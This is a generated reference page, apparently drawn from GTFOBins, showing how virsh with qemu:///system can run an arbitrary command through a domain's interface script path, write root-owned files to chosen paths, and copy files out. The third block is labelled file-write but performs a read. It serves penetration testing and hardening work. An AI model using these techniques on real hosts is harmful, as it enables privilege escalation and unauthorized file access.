---
parsed_by: focuslocust
source: commands
type: generated
---
# virsh Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## virsh

Tool page: [virsh](../../tools/linux/virsh.md)

### command

```text
cat >/path/to/temp-file.xml <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='/path/to/command'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/virsh` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
echo DATA >/path/to/temp-file

cat >/path/to/temp-file.xml <<EOF
<volume type='file'>
  <name>y</name>
  <key>/path/to/output-dir/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>/path/to/output-dir/output-file</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/
virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml
virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file
virsh -c qemu:///system pool-destroy x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/virsh` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/
virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/virsh` |
| Evidence | Function example preserved from source parser. |
